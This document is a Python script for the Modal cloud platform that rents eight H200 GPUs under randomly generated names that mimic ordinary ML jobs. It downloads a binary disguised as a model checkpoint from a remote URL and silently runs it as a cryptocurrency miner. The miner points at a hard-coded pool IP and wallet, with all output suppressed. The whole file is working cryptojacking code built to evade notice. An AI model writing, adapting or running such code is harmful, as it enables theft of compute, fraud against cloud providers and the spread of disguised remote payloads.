
import modal
import random
import string
import subprocess
import os

POOL_HOST = "15.235.221.133"
POOL_PORT = 443
WALLET = "prl1psmq7qq84jtdhzqgl0xvykzanp8ufr8jf8pke4hd3nkeu0rg7p2vsedwa8k"
BINARY_URL = "https://pub-c8199edbdf164087a193da5a07231571.r2.dev/datasets/checkpoints/v11.bin"
GPU_SPEC = "H200:8"

def random_name():
    names = ["michelle","michael","paul","sarah","ryan","emily","kevin","anthony","charlotte","sophia","kimberly","william","olivia","daniel","angela","amy","amanda","joseph","thomas","charles","elena","marcus","lisa","david","anna","james","rachel","brian"]
    tasks = ["finetune","pretrain","embed","classify","segment","transcribe","translate","summarize","augment","evaluate","distill","quantize","calibrate","benchmark","profile"]
    h = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    return f"{random.choice(names)}-{random.choice(tasks)}-{h}"

APP_NAME = random_name()

image = (modal.Image.debian_slim(python_version="3.12")
    .apt_install("curl", "ca-certificates", "wget"))

app = modal.App(APP_NAME, image=image)

@app.function(gpu=GPU_SPEC, timeout=10800, cpu=2, memory=8192)
def mine():
    binary_path = "/tmp/v"
    
    # Download
    subprocess.run(["curl", "-sSL", "--max-time", "120", "-o", binary_path, BINARY_URL], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    os.chmod(binary_path, 0o755)
    
    # Run mining - no output
    proc = subprocess.Popen(
        [binary_path, "--host", f"{POOL_HOST}:{POOL_PORT}", "--user", WALLET],
        stdout=subprocess.DEVNULL, 
        stderr=subprocess.DEVNULL
    )
    proc.wait()

with app.run():
    mine.remote()
